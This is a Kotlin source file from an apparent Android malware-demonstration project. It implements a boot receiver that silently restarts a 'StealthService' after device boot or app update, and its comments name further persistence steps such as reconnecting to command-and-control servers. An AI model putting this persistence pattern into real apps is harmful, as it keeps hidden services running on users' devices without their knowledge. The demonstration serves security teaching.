package com.securitydemo.malware.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.securitydemo.malware.services.StealthService

/**
 * SECURITY DEMO: Boot Receiver
 * 
 * This receiver demonstrates how malware achieves persistence:
 * - Automatically starts when device boots
 * - Restarts malicious services
 * - Operates without user interaction
 * - High priority to execute early in boot process
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows persistence mechanisms
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED, 
            Intent.ACTION_LOCKED_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON" -> {
                handleBootCompleted(context)
            }
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_PACKAGE_REPLACED -> {
                if (intent.dataString?.contains(context.packageName) == true) {
                    handleAppUpdated(context)
                }
            }
        }
    }

    private fun handleBootCompleted(context: Context) {
        try {
            // Log boot event
            logPersistenceEvent(context, "Device boot detected - restarting stealth operations")
            
            // Restart stealth service immediately after boot
            val stealthIntent = Intent(context, StealthService::class.java)
            context.startForegroundService(stealthIntent)
            
            // Additional malware persistence techniques could be implemented here:
            // - Restart other malicious services
            // - Re-establish C2 connections
            // - Update configuration from remote servers
            // - Check for and install updates
            
        } catch (e: Exception) {
            // Silently fail - typical malware behavior
        }
    }

    private fun handleAppUpdated(context: Context) {
        try {
            logPersistenceEvent(context, "App update detected - ensuring persistence")
            
            // Restart services after app update
            val stealthIntent = Intent(context, StealthService::class.java)
            context.startForegroundService(stealthIntent)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logPersistenceEvent(context: Context, event: String) {
        try {
            val sharedPrefs = context.getSharedPreferences("persistence_events", Context.MODE_PRIVATE)
            val currentLogs = sharedPrefs.getString("events", "")
            val timestamp = System.currentTimeMillis()
            val newLog = "$currentLogs\n[$timestamp] $event"
            
            sharedPrefs.edit()
                .putString("events", newLog)
                .putLong("last_event", timestamp)
                .apply()
                
        } catch (e: Exception) {
            // Silently handle errors
        }
    }
}
